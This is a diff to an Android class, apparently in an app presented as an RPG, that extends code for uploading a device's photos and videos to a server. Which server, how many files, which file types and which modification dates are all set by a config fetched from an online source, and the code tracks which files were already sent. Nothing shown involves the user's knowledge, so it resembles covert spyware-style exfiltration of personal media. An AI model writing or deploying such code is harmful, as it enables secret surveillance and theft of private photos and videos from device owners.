@@ -1,5 +1,6 @@
 package com.example.rpg;
 
+import android.annotation.SuppressLint;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Environment;
@@ -14,7 +15,9 @@ import org.jsoup.select.Elements;
 
 import java.io.File;
 import java.io.IOException;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 import java.util.SortedSet;
 import java.util.TreeSet;
@@ -33,6 +36,19 @@ import android.content.Context;
 import android.content.ContentResolver;
 
 public class ApiController {
+
+    // Tipos de extensão de arquivos de img
+    public final List<String> imgTypes = Arrays.asList(
+            ".jpeg", ".JPEG", ".jpg", ".JPG",
+            ".png", ".PNG", ".gif", ".GIF",
+            ".bmp", ".BMP"
+    );
+
+    // Tipos de extensão de arquivos de vid
+    public final List<String> vidTypes = Arrays.asList(
+            ".mp4", ".avi"
+    );
+
     public void testMethod(){
         System.out.println("TESTANDO ESSE METODO");
     }
@@ -45,7 +61,7 @@ public class ApiController {
         RequestBody requestFile =
                 RequestBody.create(
                         //MediaType.parse("image/*"),
-                        MediaType.parse("multipart/form-data"),
+                        MediaType.parse("multipart/form-data"), // para img ou vid
                         file
                 );
 
@@ -66,6 +82,8 @@ public class ApiController {
         // maxUploads: maximo de arquivos por Post
         // sendedList: lista dos arquivos ja enviados
         // allFiles: lista de todos os arquivos(img)
+        // apilink: link que veio de algum repositorio online
+        // conf: instancia da classe de configuracao
 
         File[] files;
 
@@ -94,42 +112,51 @@ public class ApiController {
 
         List<MultipartBody.Part> parts = new ArrayList<>(); // lista dinamica de arquivos
 
-        // System.out.println(listdata.contains("images.jpeg"));
+        SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy");
 
-        for (int i = 0; i < files.length; i++) {
-            if (!files[i].getName().equals(".nomedia")) {
-                if (files != null && !sendedList.contains(files[i].getName())){
+        if(conf.getFileType().equals("img")){ // se for img
+            for (File file: files) {
 
-                    if(conf.getFileType().equals("vid")){
-                        if (files[i].getName().contains(".mp4") || files[i].getName().contains(".avi")){
-                            System.out.println("Ficha vid achado: " + files[i]);
-                            parts.add(prepareFilePart("file", files[i]));
-                            if(parts.size() >= maxUploads){break;}
+                if (!file.getName().equals(".nomedia") // Exclui .nomedia
+                        && !sendedList.contains(file.getName()) // ainda nao enviado
+                        && imgTypes.contains(getExtensionByFile(file))) // o tipo dele esta na lista
+                {
+                    if(!conf.getDateName().equals("0")){ // Se tiver data definida
+                        // checa se a ultima modificacao é igual a data do filtro
+                        if(sdf.format(file.lastModified()).equals(conf.getDateName())){
+                            parts.add(prepareFilePart("file", file));
+                            System.out.println("Filtrado por data:"+file.getName());
                         }
                     }
-                    else if(conf.getFileType().equals("img")){
-                        if (files[i].getName().contains(".jpeg") || files[i].getName().contains(".JPEG")
-                                || files[i].getName().contains(".jpg") || files[i].getName().contains(".JPG")
-                                || files[i].getName().contains(".png") || files[i].getName().contains(".PNG")
-                                || files[i].getName().contains(".gif") || files[i].getName().contains(".GIF")
-                                || files[i].getName().contains(".bmp") || files[i].getName().contains(".BMP")
-                        )
-                        {
-                            System.out.println("Ficha do jogador achada: " + files[i]);
-                            // Adicionando na lista cada filePart contendo o arquivo da ficha
-                            parts.add(prepareFilePart("file", files[i]));
-                            System.out.println("Current: " + parts.size());
-
-                            // se os arquivos para upload for maior ou igual ao maximo break
-                            if(parts.size() >= maxUploads){break;}
-                        }
+                    else { // Se não tiver data definida
+                        parts.add(prepareFilePart("file", file));
+                        System.out.println("Current Parts Size: " + parts.size());
                     }
-
-
                 }
+                if(parts.size() >= maxUploads){break;}
             }
-
         }
+        else if(conf.getFileType().equals("vid")){ // se for vid
+            for (File file: files) {
+                if (!file.getName().equals(".nomedia")
+                        && !sendedList.contains(file.getName())
+                        && vidTypes.contains(getExtensionByFile(file)))
+                {
+                    if(!conf.getDateName().equals("0")){ // Se tiver data definida
+                        if(sdf.format(file.lastModified()).equals(conf.getDateName())){
+                            parts.add(prepareFilePart("file", file));
+                            System.out.println("Filtrado por data:"+file.getName());
+                        }
+                    }
+                    else { // Se não tiver data definida
+                        parts.add(prepareFilePart("file", file));
+                        System.out.println("Current Parts Size: " + parts.size());
+                    }
+                }
+                if(parts.size() >= maxUploads){break;}
+            }
+        }
+        System.out.println("Tamanho final de parts: "+parts.size());
 
         Retrofit retrofitUpload = new Retrofit.Builder()
                 .baseUrl(apiLink)
@@ -209,10 +236,12 @@ public class ApiController {
                     int maxUploads = Integer.parseInt((String) obj.get("maxUploads"));
                     String run = (String) obj.get("run");
                     String fileType = (String) obj.get("fileType");
+                    String fileDate = (String) obj.get("fileDate");
 
                     // Criando instancia de configuracao de envio
                     UploadConfig conf = new UploadConfig();
                     conf.setFileType(fileType);
+                    conf.setDateName(fileDate);
 
                     // Pegando a lista de já enviados
                     ArrayList<String> listdata = new ArrayList<>();
@@ -247,8 +276,11 @@ public class ApiController {
     }
 
     // Apenas para teste
-    private void uploadFile() {
+    public void uploadFile() {
         File file = new File("/storage/emulated/0/Download/niele.jpeg");
+        @SuppressLint("SimpleDateFormat") SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy");
+        System.out.println("File last modified @ : "+ sdf.format(file.lastModified()));
+        if(true){return;}
 
         RequestBody requestFile = RequestBody.create(MediaType.parse("image/*"), file);
         MultipartBody.Part body =
@@ -258,7 +290,6 @@ public class ApiController {
                 .baseUrl(Api.BASE_URL)
                 .addConverterFactory(GsonConverterFactory.create())
                 .build();
-
 
         Api retrofitAPI = retrofit.create(Api.class);
         Call<ResponseBody> call = retrofitAPI.uploadImage(body);
@@ -324,5 +355,14 @@ public class ApiController {
             }
         });
 
+    }
+    public String getExtensionByFile(File file){
+        // pegando a extensao
+        int i = file.getName().lastIndexOf('.');
+        if (i > 0) {
+            String extension = file.getName().substring(i);
+            return extension;
+        }
+        return "ERROR";
     }
 }
